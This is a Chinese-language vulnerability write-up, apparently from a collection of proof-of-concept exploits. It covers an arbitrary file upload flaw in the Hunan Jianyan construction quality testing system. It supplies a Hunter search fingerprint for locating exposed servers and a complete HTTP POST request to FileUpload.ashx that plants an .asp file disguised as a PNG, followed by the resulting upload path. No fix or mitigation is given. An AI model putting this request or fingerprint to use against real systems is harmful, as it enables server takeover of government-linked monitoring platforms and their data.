# 湖南建研工程质量检测系统FileUpload存在任意文件上传漏洞

# 一、漏洞简介
湖南建研质量监测系统由相关政府质量监督机构、参建单位等共同参与，根据各自的职责，上网操作相应的模块，实现工程质量监督业务的统一管理。该系统存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 湖南建研工程质量检测系统

# 三、资产测绘
+ hunter`web.body="/Content/Theme/Standard/webSite/login.css"`
+ 特征

![1702346060563-9e664378-c6d3-46b6-84b3-8d0043c714cd.png](./img/IwfdowcgtbTh-STO/1702346060563-9e664378-c6d3-46b6-84b3-8d0043c714cd-785769.png)

# 四、漏洞复现
```plain
POST /Platform/System/FileUpload.ashx HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Connection: close
Content-Length: 336
Accept-Encoding: gzip
Content-Type: multipart/form-data; boundary=----YsOxWxSvj1KyZow1PTsh98fdu6l

------YsOxWxSvj1KyZow1PTsh98fdu6l
Content-Disposition: form-data; name="file"; filename="YsOxWxSvj1KyZow1PTsh98fdu63.asp"
Content-Type: image/png

123
------YsOxWxSvj1KyZow1PTsh98fdu6l
Content-Disposition: form-data; name="target"

/Applications/SkillDevelopAndEHS/
------YsOxWxSvj1KyZow1PTsh98fdu6l--
```

![1703507070360-9784a7d0-7511-4b04-81d2-07f780b073f8.png](./img/IwfdowcgtbTh-STO/1703507070360-9784a7d0-7511-4b04-81d2-07f780b073f8-646404.png)

上传文件位置

```plain
/Applications/SkillDevelopAndEHS/YsOxWxSvj1KyZow1PTsh98fdu63.asp
```

![1703507089398-37c89680-29c6-44ae-8fcf-a39b42416248.png](./img/IwfdowcgtbTh-STO/1703507089398-37c89680-29c6-44ae-8fcf-a39b42416248-473006.png)



> 更新: 2024-02-29 23:55:43  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hua2qyfh2eyq7raf>